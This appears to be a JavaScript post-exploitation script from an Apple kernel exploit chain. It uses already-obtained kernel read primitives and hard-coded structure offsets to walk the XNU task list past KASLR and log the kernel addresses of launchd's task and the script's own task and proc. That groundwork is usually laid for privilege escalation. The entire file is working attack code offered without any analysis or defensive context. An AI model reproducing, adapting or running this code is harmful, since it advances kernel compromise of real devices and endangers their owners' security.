// find_procs.js — Walk task list and print all processes with confirmed offsets
// Offsets: taskNext=0x30, procRO=0x3e0, proc=deref(procRO), pid=proc+0x60

var kt = kread64(slide('0xc1bf78'));
log('kernel_task = ' + kt);
var task = kread64(add(kt, '0x30'));
var ourPid = pid();
log('Our PID: ' + ourPid);
log('');
log('  PID  | TASK               | PROC               | PROC_RO');
log('-------+--------------------+---------------------+--------------------');

var count = 0;
var launchdTask = '0x0';
var ourTask = '0x0';
var ourProc = '0x0';

for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0' || proc.indexOf('0xffffff') != 0) { task = kread64(add(task, '0x30')); continue; }
  var p = kread32(add(proc, '0x60'));
  var pDec = parseInt(p, 16);

  var marker = '';
  if (pDec == 1) { launchdTask = task; marker = ' <== launchd'; }
  if (pDec == ourPid) { ourTask = task; ourProc = proc; marker = ' <== US'; }

  if (pDec <= 5 || pDec == ourPid || marker) {
    log(' ' + ('' + pDec).padStart(4) + '  | ' + task + ' | ' + proc + ' | ' + procRO + marker);
  }
  count++;
  task = kread64(add(task, '0x30'));
}

log('');
log('Total: ' + count + ' tasks');
log('launchd task: ' + launchdTask);
log('our task: ' + ourTask);
log('our proc: ' + ourProc);
